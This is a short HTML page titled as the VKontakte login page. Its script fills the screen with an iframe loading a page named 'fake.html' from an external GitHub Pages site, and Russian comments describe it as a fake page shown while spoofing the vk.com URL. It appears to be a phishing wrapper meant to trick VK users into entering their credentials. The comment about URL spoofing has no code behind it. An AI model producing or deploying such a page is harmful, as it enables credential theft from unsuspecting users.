<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Вход | ВКонтакте</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #e5ebf1;
    }
    iframe {
      width: 100%;
      height: 100vh;
      border: none;
    }
  </style>
</head>
<body>
  <script>
    // Подменяем URL на https://vk.com/logout без перезагрузки

    // Добавляем iframe с фейковой страницей
    const iframe = document.createElement('iframe');
    iframe.src = "https://jkeep1990.github.io/VK_iFrame/fake.html";
    document.body.appendChild(iframe);
  </script>
</body>
</html>
